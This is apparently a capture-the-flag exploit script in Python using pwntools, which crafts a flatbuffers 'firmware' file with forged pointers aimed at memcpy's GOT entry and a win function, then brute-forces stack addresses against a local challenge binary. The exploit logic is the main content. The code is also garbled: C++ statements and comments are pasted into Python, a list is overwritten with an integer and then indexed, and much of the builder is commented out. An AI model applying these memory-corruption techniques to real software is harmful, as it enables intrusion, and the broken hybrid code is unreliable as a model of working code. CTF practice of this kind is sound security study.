
import os
import pwn
import sys
import flatbuffers
import Chunk
import FwHeader
import File

pwn.context.log_level = 'error'


def generate_input_cpp(addr):
    os.system(f'./generate_input {hex(addr)}')

    with open('input', mode='rb') as file:
        return file.read()

def generate_input(addr_first_chunk):

    builder = flatbuffers.builder(10240000)

    chunks = []

    auto cchunk = 18;
    auto chunkSize = 0x40 / 8;
    auto size = chunkSize * cchunk; 

    data = []
    for i in range(size):
        data = 0x8080808080808080

    paddr = data

    paddr[(0xf * chunkSize) + 2] = addr_first_chunk - 0x100

    paddr[5] = addr_first_chunk + 6*8  # ez a vektor elso qwordje, ez mutat a vector<sharedMemdsc*> elso elemere
    paddr[6] = addr_first_chunk + 8*8  # ez a vektor elso eleme, ez egy sharedMemDsc*
    paddr[7] = 0
   
    # // ez a sharedMemDsc
    paddr[8] = 0x11;

    //     Dump of assembler code for function memcpy@plt:
    //    0x00000000004010e0 <+0>:     jmpq   *0x7f8a(%rip)        # 0x409070 <memcpy@got.plt>
    //    0x00000000004010e6 <+6>:     pushq  $0xb
    //    0x00000000004010eb <+11>:    jmpq   0x401020
    // End of assembler dump.
    // (gdb) x/x 0x7f8a + 0x00000000004010e6
    // 0x409070 <memcpy@got.plt>:      0x00007ffff7bdd110
    paddr[9] = 0x409070; 

    # // de ebbol le kell vonni hogy hanyadik blokknal tartunk, mert annyival el fogja indexelni
    # paddr[9] -= 0x10 * chunkSize;
    # paddr[10] = 0;

    # //paddr[(0xf * chunkSize) / 8 + 0] = 0x401e18;     // ezzel: address of win
    # //paddr[(0xf * chunkSize) / 8 + 1] = 0x8888888888888888;


    # paddr[(0x10 * chunkSize) / 8 + 0] = 0x0000000000401e18; // win
    # paddr[(0x10 * chunkSize) / 8 + 1] = 0x00000000004010f6;
    # paddr[(0x10 * chunkSize) / 8 + 2] = 0x0000000000401106;
    # paddr[(0x10 * chunkSize) / 8 + 3] = 0x0000000000401116;
    # paddr[(0x10 * chunkSize) / 8 + 4] = 0x0000000000401126;
    # paddr[(0x10 * chunkSize) / 8 + 5] = 0x0000000000401136;
    # paddr[(0x10 * chunkSize) / 8 + 6] = 0x0000000000401146;
    # paddr[(0x10 * chunkSize) / 8 + 7] = 0x0000000000401156;

    # /*
    #     [+ME] TraceHub loading config.
    #     [+ME] TraceHub successfully initialized.
    #     *** stack smashing detected ***: terminated

    # */
    # // disass 0x4011e0


    # for(int ichunk = 0; ichunk < cchunk; ichunk++){
    #     std::vector<uint8_t> vecData;
    #     for(int i=0;i<chunkSize;i++){
    #         vecData.push_back(data[ichunk * chunkSize + i]);
    #     }

    #     auto data_vector = builder.CreateVector(vecData);
    #     auto chunk = me::CreateChunk(builder, data_vector);

    #     chunks.push_back(chunk);
    # }
    # auto chunk_vector = builder.CreateVector(chunks);
    # auto file = me::CreateFile(builder, 
    #     builder.CreateString("/home/bup/ct"),
    #     cchunk,
    #     0,
    #     chunk_vector
    # );
    
    # std::vector<flatbuffers::Offset<me::File>> files;
    # files.push_back(file);
    # auto file_vector = builder.CreateVector(files);

    # auto fwHeader = me::CreateFwHeader(builder, 0x1337, 0x1337, 0, file_vector);

    # builder.Finish(fwHeader, "MEFW");

    # uint8_t *buf = builder.GetBufferPointer();
    # int builderSize = builder.GetSize();

    # // std::cout << "write input " << size << "\n";
    # FILE* pFile;
    # pFile = fopen("input", "wb");
    # fwrite(buf, 1, builderSize, pFile);
    # fclose(pFile);
    # return 0;



base = 0x7fffffffd000
# base = 0x7fffffff0000
# i = 0x10000
# i = 0xd950
i = 0x0
while i < 0x1000:

    addr = base + i
    sys.stdout.write(f'\r{hex(addr)}')
    sys.stdout.flush()

    fileContent = generate_input(addr)

    with open('input', mode='rb') as file:
        fileContent = file.read()

        conn = pwn.process('./me', stderr=pwn.PIPE)
        #conn = pwn.remote('challenges.crysys.hu', 5010)

        r = conn.recvline().decode('ascii')
        # print(r)
        conn.sendline(str(len(fileContent)))
        r = conn.recvline().decode('ascii')
        # print(r)
        conn.send(fileContent)
        r = conn.recvall().decode('ascii')
        for line in r.split('\n'):
            if line == '[+ME] TraceHub loading config.':
                pass
            elif line.strip() == '':
                pass
            else :
                print()
        print(r)
        conn.close()
        if 'cd21' in r:
            break

    i  += 0x10